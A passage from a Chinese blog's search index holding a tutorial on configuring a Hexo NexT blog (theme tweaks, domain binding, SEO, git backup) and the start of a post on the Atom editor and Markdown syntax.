<h4 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a><strong>设置分类</strong></h4><p>修改站点配置文件中category_map 字段设置分类名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Category &amp; Tag</div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">  Category1:</div><div class="line">  Category2:</div><div class="line">  Category3:</div><div class="line">tag_map:</div></pre></td></tr></table></figure></p>
<h4 id="设置代码高亮"><a href="#设置代码高亮" class="headerlink" title="设置代码高亮"></a><strong>设置代码高亮</strong></h4><p>修改站点配置文件中 highlight_theme 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night bright</div></pre></td></tr></table></figure></p>
<h4 id="修改文章内链样式"><a href="#修改文章内链样式" class="headerlink" title="修改文章内链样式"></a><strong>修改文章内链样式</strong></h4><p>将内链设置为蓝色，鼠标选中时显示下划线。在 <code>themes/next/source/css/_custom/custom.styl</code> 中添加如下样式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: #0593d3;</div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: #0477ab;</div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="图片居中"><a href="#图片居中" class="headerlink" title="图片居中"></a><strong>图片居中</strong></h4><p>修改<code>/themes/next/source/css/_schemes/Mist/</code>目录下的 _posts-expanded.styl。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.post-body img &#123; margin: 0 ; &#125;</div><div class="line">改为</div><div class="line">.post-body img &#123; margin: 0 auto; &#125;</div></pre></td></tr></table></figure></p>
<h4 id="设置站点logo"><a href="#设置站点logo" class="headerlink" title="设置站点logo"></a><strong>设置站点logo</strong></h4><p>通过网站 favicon 在线制作制作 favicon 图片，把图片放在<code>/themes/next/source/image</code> 目录中，然后修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">favicon: images/favicon.ico</div></pre></td></tr></table></figure></p>
<h4 id="首页文章摘要"><a href="#首页文章摘要" class="headerlink" title="首页文章摘要"></a><strong>首页文章摘要</strong></h4><p>在首页只显示文章部分摘要，点击 “Read more” 查看全文。修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto_excerpt:</div><div class="line">  enable: true</div><div class="line">  length: 150</div></pre></td></tr></table></figure></p>
<h4 id="更改内容区域的宽度"><a href="#更改内容区域的宽度" class="headerlink" title="更改内容区域的宽度"></a><strong>更改内容区域的宽度</strong></h4><p>编辑主题的 <code>source/css/_variables/custom.styl</code> 文件，新增变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// change width when width of screen &lt; 1600px</div><div class="line">$content-desktop = 800px</div><div class="line">// change width when width of screen &gt;= 1600px</div><div class="line">$content-desktop-large = 1000px</div></pre></td></tr></table></figure></p>
<h4 id="访客量与阅读量统计"><a href="#访客量与阅读量统计" class="headerlink" title="访客量与阅读量统计"></a><strong>访客量与阅读量统计</strong></h4><p>使用不蒜子统计，修改主题配置文件的 busuanzi_count 的配置项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  # count values only if the other configs are false</div><div class="line">  enable: true</div><div class="line">  # custom uv span for the whole site</div><div class="line">  site_uv: true</div><div class="line">  site_uv_header: 访客数</div><div class="line">  site_uv_footer: 人次</div><div class="line">  # custom pv span for the whole site</div><div class="line">  site_pv: true</div><div class="line">  site_pv_header: 总访问量</div><div class="line">  site_pv_footer: 次</div><div class="line">  # custom pv span for one page only</div><div class="line">  page_pv: true</div><div class="line">  page_pv_header: 阅读次数</div><div class="line">  page_pv_footer:</div></pre></td></tr></table></figure></p>
<h4 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a><strong>添加本地搜索</strong></h4><p>使用NexT主题内置的本地站内搜索，执行 <code>$ npm install hexo-generator-search --save</code> 安装插件，然后在站点配置文件中，添加以下内容到任意位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">path: search.xml</div><div class="line">field: post</div><div class="line">format: html</div><div class="line">limit: 10000</div></pre></td></tr></table></figure></p>
<p>编辑主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Local search</div><div class="line">local_search:</div><div class="line">  enable: true</div></pre></td></tr></table></figure></p>
<h4 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a><strong>添加评论功能</strong></h4><p>next 主题支持 Disqus，Hypercomments，网易云跟贴等多种第三方评论系统，这里采用网易云跟帖。<br>1）首先，登录网易云跟帖，填写站点信息，其中，站点网站为 blog 地址，要求必须为独立域名，github.io 无法收录。<br>2）然后点击获取代码，进行皮肤和功能的设置。<br>3）最后点击 APP SDK 获取 KEY。修改blog主题配置文件，将key填入相应字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Gentie productKey</div><div class="line">gentie_productKey: xxxxxxxxxxxxxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure></p>
<p>4）重新部署 blog 即可生效。</p>
<h3 id="0x07-域名绑定"><a href="#0x07-域名绑定" class="headerlink" title="0x07 域名绑定"></a><strong>0x07 域名绑定</strong></h3><h4 id="1）购买域名"><a href="#1）购买域名" class="headerlink" title="1）购买域名"></a><strong>1）购买域名</strong></h4><p>首先需要购买一个域名，我是在腾讯云买的，支付后要进行实名认证才能正常使用。</p>
<h4 id="2）创建-CNAME"><a href="#2）创建-CNAME" class="headerlink" title="2）创建 CNAME"></a><strong>2）创建 CNAME</strong></h4><p>在 blog 目录下的 source 文件夹中新建文件 CNAME，并将域名写入该文件。之后重新部署blog。</p>
<h4 id="3）配置域名解析"><a href="#3）配置域名解析" class="headerlink" title="3）配置域名解析"></a><strong>3）配置域名解析</strong></h4><p>添加以下3条记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@          A             192.30.252.153</div><div class="line">@          A             192.30.252.154</div><div class="line">www      CNAME           username.github.io</div></pre></td></tr></table></figure></p>
<p>设置好后可能需要等一段时间才能生效。</p>
<h3 id="0x08-SEO优化"><a href="#0x08-SEO优化" class="headerlink" title="0x08 SEO优化"></a><strong>0x08 SEO优化</strong></h3><p>为了能让 Google 能搜到 blog 中的内容，需要优化站点的 SEO（Search  Engine Optimization）。</p>
<h4 id="1）添加sitemap"><a href="#1）添加sitemap" class="headerlink" title="1）添加sitemap"></a><strong>1）添加sitemap</strong></h4><p>首先 执行 <code>npm install hexo-generator-sitemap --save</code> 安装 sitemap 生成插件，然后在站点配置文件添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">##sitemap</div><div class="line">sitemap:</div><div class="line">  path: sitemap.xml</div></pre></td></tr></table></figure></p>
<h4 id="2）添加-robots-txt"><a href="#2）添加-robots-txt" class="headerlink" title="2）添加 robots.txt"></a><strong>2）添加 robots.txt</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># hexo robots.txt</div><div class="line">User-agent: *</div><div class="line">Allow: /</div><div class="line">Allow: /archives/</div><div class="line">Allow: /categories/</div><div class="line">Allow: /about/</div><div class="line">Allow: /tags/</div><div class="line"></div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /js/</div><div class="line">Disallow: /css/</div><div class="line">Disallow: /fonts/</div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /fancybox/</div><div class="line"></div><div class="line">Sitemap: http://0x4c43.cn/sitemap.xml</div></pre></td></tr></table></figure>
<h4 id="3）验证-blog-网站"><a href="#3）验证-blog-网站" class="headerlink" title="3）验证 blog 网站"></a><strong>3）验证 blog 网站</strong></h4><p>进入 Google 搜索引擎入口，<code>添加属性 &gt; 备用方法 &gt; HTML 标记</code>，将 Google 的 html 标签，添加到 <code>/themes/next/layout/_partials/head.swig</code> 文件中，重新发布 blog，点击验证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta name=&quot;google-site-verification&quot; content=&quot;-rILxxxxx7gbfxxxxx-E1VWxxxxxTcq6pxgs_xxxxx&quot; /&gt;</div></pre></td></tr></table></figure></p>
<h4 id="4）收录站点"><a href="#4）收录站点" class="headerlink" title="4）收录站点"></a><strong>4）收录站点</strong></h4><p>点击<code>网址 &gt; 抓取 &gt; 站点地图 &gt; 添加测试站点地图 &gt; 填写sitemap.xml &gt; 提交</code>。大概过一天之后便能通过Google搜索到。</p>
<h4 id="5）给出站链接添加-“nofollow”-标签"><a href="#5）给出站链接添加-“nofollow”-标签" class="headerlink" title="5）给出站链接添加 “nofollow” 标签"></a><strong>5）给出站链接添加 “nofollow” 标签</strong></h4><p>nofollow 标签是由谷歌领头创新的一个 “反垃圾链接” 的标签，并被百度、yahoo 等各大搜索引擎广泛支持，引用 nofollow 标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上的带有 nofollow 属性的任何出站链接，以减少垃圾链接的分散网站权重。</p>
<p>a．打开<code>/themes/next/layout/_partials/footer.swig</code>，将代码中的a标签加上 rel=”external nofollow”属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://hexo.io&quot; rel=&quot;external nofollow&quot;&gt;Hexo&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>b．打开<code>/themes/next/layout/_macro/sidebar.swig</code> 文件，将下面代码中的a标签加上 rel=”external nofollow” 属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;&#123;&#123; link &#125;&#125;&quot; title=&quot;&#123;&#123; name &#125;&#125;&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div><div class="line"></div><div class="line">&lt;a href=&quot;https://creativecommons.org/&#123;% if theme.creative_commons === &apos;zero&apos; %&#125;publicdomain/zero/1.0&#123;% else %&#125;licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0&#123;% endif %&#125;/&quot; class=&quot;cc-opacity&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="6）添加文章-keywords-和-description"><a href="#6）添加文章-keywords-和-description" class="headerlink" title="6）添加文章 keywords 和 description"></a><strong>6）添加文章 keywords 和 description</strong></h4><p>在<code>\scaffolds\post.md</code> 中添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keywords:</div><div class="line">categories:</div></pre></td></tr></table></figure></p>
<p>新建post的时候添加keywords，会自动转成 <code>&lt;meta name=&quot;keywords&quot; content=&quot;XXX&quot; /&gt;</code>。</p>
<h4 id="7）优化首页-title"><a href="#7）优化首页-title" class="headerlink" title="7）优化首页 title"></a><strong>7）优化首页 title</strong></h4><p>修改<code>\themes\next\layout\index.swig</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125;  &#123;% endblock %&#125;</div><div class="line">改成</div><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125;  &#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="8）修改网站链接"><a href="#8）修改网站链接" class="headerlink" title="8）修改网站链接"></a><strong>8）修改网站链接</strong></h4><p>编辑站点配置文件，将 url 修改为网站域名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url: http://0x4c43.cn</div></pre></td></tr></table></figure></p>
<h4 id="9）修改文章链接形式"><a href="#9）修改文章链接形式" class="headerlink" title="9）修改文章链接形式"></a><strong>9）修改文章链接形式</strong></h4><p>默认文章链接形式为<code>domain/year/month/day/title</code>，以改成<code>domain/title</code> 的形式，修改站点配置文件中 permalink 字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">permalink: :title/</div></pre></td></tr></table></figure></p>
<h3 id="0x09-Blog备份与恢复"><a href="#0x09-Blog备份与恢复" class="headerlink" title="0x09 Blog备份与恢复"></a><strong>0x09 Blog备份与恢复</strong></h3><p>Hexo blog 发布后，在 github 仓库中只保存有生成的静态文件，而 blog 的源文件：主题和文章等只保存在本地。为了避免电脑出故障导致数据丢失带来的麻烦，可以将源文件备份到 github 上。</p>
<h4 id="1-备份"><a href="#1-备份" class="headerlink" title="1. 备份"></a><strong>1. 备份</strong></h4><p>1）修改.gitignore 文件<br>指定部分文件不备份。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">Thumbs.db</div><div class="line">db.json</div><div class="line">*.log</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">.deploy*/</div><div class="line">.deploy_git</div><div class="line">themes</div></pre></td></tr></table></figure></p>
<p>2）生成 git 仓库<br>在站点根目录下执行 <code>git init</code>。</p>
<p>3）添加远程仓库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote add origin https://github.com/0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>4）新建分支<br>在站点根目录下执行 <code>git checkout –b Hexo</code> 新建分支 Hexo 用于备份源文件。</p>
<p>5）添加到本地分支<br>将站点源文件提交到本地 Hexo 分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div></pre></td></tr></table></figure></p>
<p>6）push 到远程分支<br>执行 <code>git push origin Hexo:Hexo</code> 将本地 Hexo 分支推送到远程 Hexo 分支。</p>
<p>注：push 操作时出现错误及解决方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: unable to create directory for .git/logs/refs/remotes/origin/Hexo</div><div class="line">error: Cannot update the ref &apos;refs/remotes/origin/Hexo&apos;.</div><div class="line">solution:</div><div class="line">sudo chown -R username .</div></pre></td></tr></table></figure></p>
<p>7）成功备份<br>之后写文章之后都先备份，再发布。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div><div class="line">git push origin Hexo:Hexo</div><div class="line"></div><div class="line">hexo clean</div><div class="line">hexo d -g</div></pre></td></tr></table></figure></p>
<h4 id="2-恢复"><a href="#2-恢复" class="headerlink" title="2. 恢复"></a><strong>2. 恢复</strong></h4><p>当需要在另一台电脑上写 blog 时，可以通过以下方式恢复 Hexo 环境。<br>1）下载 Node.js 并安装<br>2）下载安装git<br>3）下载安装hexo<br>4）恢复源文件<br>通过 Git 克隆备份的 blog：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@github.com:0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>5）切换到Hexo分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout  Hexo</div></pre></td></tr></table></figure></p>
<p>6）安装 git 部署插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git</div></pre></td></tr></table></figure></p>
<p>之后就可以更新 blog 了。</p>
<h3 id="0x09-备份Next主题"><a href="#0x09-备份Next主题" class="headerlink" title="0x09 备份Next主题"></a><strong>0x09 备份Next主题</strong></h3><h4 id="1）将主题-fork-到自己仓库"><a href="#1）将主题-fork-到自己仓库" class="headerlink" title="1）将主题 fork 到自己仓库"></a><strong>1）将主题 fork 到自己仓库</strong></h4><h4 id="2）获取主题"><a href="#2）获取主题" class="headerlink" title="2）获取主题"></a><strong>2）获取主题</strong></h4><p>执行以下命令下载主题到本地。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git submolule add git@github.com:0x4C43/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="3）push-到远程分支"><a href="#3）push-到远程分支" class="headerlink" title="3）push 到远程分支"></a><strong>3）push 到远程分支</strong></h4><p>将修改好主题后 push 到远程分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;update theme&quot;</div><div class="line">git push origin</div></pre></td></tr></table></figure></p>
<h4 id="4）恢复主题"><a href="#4）恢复主题" class="headerlink" title="4）恢复主题"></a><strong>4）恢复主题</strong></h4><p>在需要恢复主题时，执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule init</div><div class="line">git submodule update</div></pre></td></tr></table></figure></p>
<hr>
<p>Reference:<br>[1] Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>[2] NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>[3] Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>[4] 推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>[5] Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>[6] Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>[7] 备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Next </tag>
            
            <tag> Github </tag>
            
            <tag> 域名绑定 </tag>
            
            <tag> SEO优化 </tag>
            
            <tag> Blog备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Atom+Markdown写文章]]></title>
      <url>/%E4%BD%BF%E7%94%A8Atom+Markdown%E5%86%99%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<h3 id="0x01-Atom"><a href="#0x01-Atom" class="headerlink" title="0x01 Atom"></a><strong>0x01 Atom</strong></h3><p>Atom 是 Github 推出的一个开源跨平台文本编辑器。具有简洁和直观的图形用户界面，支持 CSS、HTML、JavaScript 等网页编程语言。 并且支持宏和自动分屏等功能，还集成了文件管理器。同时，Atom 也支持 Markdown 语法，所以可以很方便地写 Hexo blog。</p>
<p>可以在官网下载<a href="https://atom.io/" target="_blank" rel="external">Atom</a>。</p>
<h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a><strong>常用快捷键</strong></h4><p>在File/Settings/Keybindiigns下定义了大量快捷键，常用快捷键如下:</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Crtl+Shift+M</td>
<td style="text-align:left">开启Markdown实时预览</td>
</tr>
<tr>
<td style="text-align:left">Command+Shift+P</td>
<td style="text-align:left">打开命令窗口，可以运行各种菜单功能</td>
</tr>
<tr>
<td style="text-align:left">Command + T</td>
<td style="text-align:left">多文件切换</td>
</tr>
<tr>
<td style="text-align:left">Command + F</td>
<td style="text-align:left">文件内查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + Shift + F</td>
<td style="text-align:left">多文件查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + [</td>
<td style="text-align:left">对选中内容向左缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + ]</td>
<td style="text-align:left">对选中内容向右缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + \</td>
<td style="text-align:left">显示或隐藏目录树</td>
</tr>
<tr>
<td style="text-align:left">Crtl + m</td>
<td style="text-align:left">括号之间/HTML tag之间等跳转</td>
</tr>
</tbody>
</table>
<h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a><strong>插件</strong></h4><p>Atom 支持插件扩展，下面列举一些实用的插件。点击File/Settings/Install，输入相应的插件名称进行安装。</p>
<ul>
<li><p>增强预览(markdown-preview-plus)<br>需要关闭系统自带的markdown-preview，Ctrl+Shift+M 打开预览窗口。</p>
</li>
<li><p>实时滚动预览(markdown-scroll-sync)<br>预览窗口将跟随编辑界面的鼠标移动，可实时查看效果。</p>
</li>
<li><p>格式化代码(atom-beautify)   </p>
</li>
<li><p>表格编辑(markdown-table-editor)<br>输入 table，然后按 Tab 键将自动输出表格样式。</p>
</li>
<li><p>导出pdf/png/jpeg/html(markdown-themeable-pdf)<br>在文章编辑区域单击右键，Markdown to PDF。若要导出其它格式，在File/Settings/packeages/markdown-themeable-pdf/Settings 中进行设置。</p>
</li>
<li><p>博客支持(markdown-Writer)</p>
</li>
</ul>
<h3 id="0x02-Markdown-常用语法"><a href="#0x02-Markdown-常用语法" class="headerlink" title="0x02 Markdown 常用语法"></a><strong>0x02 Markdown 常用语法</strong></h3><blockquote>
<p>Markdown 是一种轻量级标记语言，它允许人们 “易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。Markdown 最重要的设计是可读性，能直接在字面上的被阅读，而不用被一些格式化指令标记 (如 RTF 与 HTML)。 因此，它是现行电子邮件标记格式的惯例，虽然它也借鉴了很多早期的标记语言，如：setext、Texile、reStructuredText。 — wikipedia</p>
</blockquote>
<h4 id="换行"><a href="#换行" class="headerlink" title="换行"></a><strong>换行</strong></h4><p>在行尾输入两个以上的空格然后回车。</p>
<h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h4><p>在标题内容前输入特定数量的’#’来实现对应级别的HTML样式的标题(HTML提供六级标题)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## 这是 H1</div><div class="line">### 这是 H2</div><div class="line">###### 这是 H6</div></pre></td></tr></table></figure></p>
<h4 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a><strong>区块引用</strong></h4><p>在引用内容的每行或者是段首加 ‘&gt;’，引用块中可以根据层次加上不同数量的 ‘&gt;’进行嵌套引用。 同时，引用区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; #### This is a blockquote with paragraphs.</div></pre></td></tr></table></figure></p>
<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h4><p>Markdown 支持有序列表和无序列表。<br>无序列表使用 ‘*‘、’+’ 或是 ‘-‘ 作为列表标记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-   Red   </div><div class="line">-   Green   </div><div class="line">-   Blue</div></pre></td></tr></table></figure></p>
<p>有序列表则使用数字接着一个英文句点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  Bird</div><div class="line">2.  McHale</div><div class="line">3.  Parish</div></pre></td></tr></table></figure></p>
<p>当文章内容刚好行首出现数字-句点-空白时，不希望解析为有序列表，可以在句点前面加上反斜杠。</p>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a><strong>代码块</strong></h4><p>在代码块的每行前面加 4 个空格或是 1 个制表符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这是一个普通段落：</div><div class="line">    这是一个代码区块。</div></pre></td></tr></table></figure></p>
<p>当代码量较大时可以用三个反引号包围 ```。在代码块中添加一个可选的语言标识符,可以根据语法高亮显示，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;&apos;&apos; C</div><div class="line">void main() &#123;</div><div class="line">  printf (&quot;Hello World!&quot;);</div><div class="line">&#125;</div><div class="line">&apos;&apos;&apos;</div></pre></td></tr></table></figure></p>
<p>如果要标记一小段行内代码，可以用反引号``，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Use the `printf()` function.</div></pre></td></tr></table></figure></p>
<h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a><strong>分割线</strong></h4><p>在一行中用三个以上的 ‘*‘ 或 ‘-‘ 来建立个分割线，在符号中间可以插入空格。下面是几种正确的写法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">* * *</div><div class="line">***</div><div class="line">*****</div><div class="line">- - -</div><div class="line">---------------------------------------</div></pre></td></tr></table></figure></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a><strong>链接</strong></h4><p>链接文字用 [方括号] 标记，方块括号后面圆括号中为网址链接（也可以是相对路径），网址后面双引号中的内容为链接的 title，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">This is [an example](http://example.com/ &quot;Title&quot;) inline link.</div><div class="line">[This link](http://example.net/) has no title attribute.</div></pre></td></tr></table></figure></p>
<h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a><strong>强调</strong></h4><p>Markdown 使用 ‘*‘ 或 ‘_‘ 作为标记强调字词的符号。首尾各一个为斜体，首尾各两个为加粗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*single asterisks*</div><div class="line">_single underscores_</div><div class="line">**double asterisks**</div><div class="line">__double underscores__</div></pre></td></tr></table></figure></p>
<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a><strong>图片</strong></h4><p>Markdown 使用与链接相似的语法来标记图片，方括号内为图片的替代文字，圆括号内为图片地址，同样也可以加上 title。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![Alt text](/path/to/img.jpg &quot;Title&quot;)</div></pre></td></tr></table></figure></p>
